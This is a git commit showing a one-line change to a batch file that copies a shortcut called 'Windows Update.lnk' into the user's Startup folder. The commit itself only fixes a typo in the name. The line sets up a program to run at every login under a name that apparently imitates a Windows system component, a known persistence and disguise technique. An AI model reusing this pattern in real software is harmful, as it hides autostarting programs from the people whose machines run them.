d9f9b6f255deaed17884c8cba5f97ee6c3dee2a5
AbdulazizDXT <139559982+AbdulazizDXT@users.noreply.github.com>
2023-07-17 13:32:37 +0400

    Update StartUP.bat

--- StartUP.bat
+++ StartUP.bat
@@ -1,1 +1,1 @@
-copy "Window Update.lnk" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+copy "Windows Update.lnk" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
